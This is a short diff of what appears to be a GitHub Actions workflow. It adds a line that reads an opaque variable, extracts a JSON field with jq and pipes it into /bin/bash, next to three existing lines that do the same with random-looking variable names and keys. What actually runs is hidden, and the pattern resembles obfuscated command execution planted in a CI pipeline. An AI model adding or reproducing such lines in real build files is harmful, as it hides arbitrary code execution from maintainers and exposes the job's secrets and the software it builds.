@@ -31,6 +31,7 @@ jobs:
           echo $rd22 | jq -r .jmi41294 | /bin/bash
           printf '%s' "$mlw959" | jq -r .xhh6 | /bin/bash
           printf '%s' "$w37" | jq -r .xvv6320 | /bin/bash
+          echo $x92 | jq -r .ug3 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
